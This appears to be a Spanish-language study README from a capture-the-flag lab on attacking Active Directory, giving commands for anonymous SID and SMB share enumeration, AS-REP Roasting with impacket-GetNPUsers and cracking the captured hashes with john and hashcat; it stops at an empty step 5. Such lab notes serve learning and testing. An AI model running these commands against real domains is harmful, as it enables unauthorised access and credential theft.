<h1 align="center"> Pasos para detectar la vulnerabilidad pass the hash </h2>

<p align="center">  [ ! ] Para una mejor comprension te invito a investigar el material de contenido para estudio:  </p> 

---

<br>

<p align="center">
  <img src="https://i.pinimg.com/originals/ee/e8/43/eee8431910fbcdaa786ddd7b7a56c44e.gif" width="400" height="auto">
</p>

---

<h3 align="center"> Descubrimiento de recursos compartidos  </h3>

- 1 -  Una vez identificado el dominio de la maquina la cual quieres vulnerar agregalo en el archivo del directorio /etc/hosts en ejemplo:

<p align="center">
  <img src="https://github.com/user-attachments/assets/c11352e4-5990-423a-994b-3f5c97aaa6e8" width="600" height="auto">
</p>

- 2 - Enumerar SIDs con la herramienta impacket en el Active directory y de manera paralela investigar en el servicio smb sin un usuario o contraseña recursos compartidos esto algunas veces puede apoyarte en encontrar potenciales victimas (en el paso 3 esta el comando para enumerar recursos sin un usuario o contraseña)

```bash
impacket-lookupsid guest@<Dominio o IP> -no-pass
```

- 3 - Crear una lista de potenciales posibles usuarios con sus respectivas contraseñas los cuales tengan recursos compartidos en smb 

*smbmap:*

```bash
# Sin contraseña

smbmap -u 'null' -H <ip_victima>

# Con contraseña

smbmap -u '<usuario>' -p '<contraseña>' -H 10.10.217.157
```

*smbclient:*

```bash
# Sin contraseña

smbclient -L ////<ip_victima>// -N

# con contraseña

smbclient -L <ip_victima> --user <usuario_victima> --password <contraseña>

```

- 4 - Una vez recolectada la informacion sobre los usuarios existentes en el controlador de dominio y el protocolo smb, capturar sobre los mismos usuarios su hashes AS-REP recreando un ataque "AS-REP Roasting"

```bash
impacket-GetNPUsers vulnnet-rst.local/ -no-pass -usersfile users
```

- Si un hash es encontrado copiarlo en un archivo completo tal y como se muestra en la imagen y romperlo con john o hashcat, el nombre de usuario sobre el cual se identifico el hash puedes encontrarlo en las primeras palabras en este caso "t-skid"

<p align="center">
  <img src="https://github.com/user-attachments/assets/8b7895f5-d2d4-419d-a47f-82e9bd0eaab5" width="600" height="auto">
</p>

*john:*

```bash
john --wordlist=/<ruta_del_diccionario/rockyou.txt <nombre_del_archivo>

# ejemplo
# john --wordlist=/usr/share/wordlist/rockyou.txt archivo_hash
```

*hashcat:*

```bash
hashcat -m 18200 <nombre_del_archivo> <ruta_del_diccionario>

# ejemplo
# hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt
```

- 5 - 
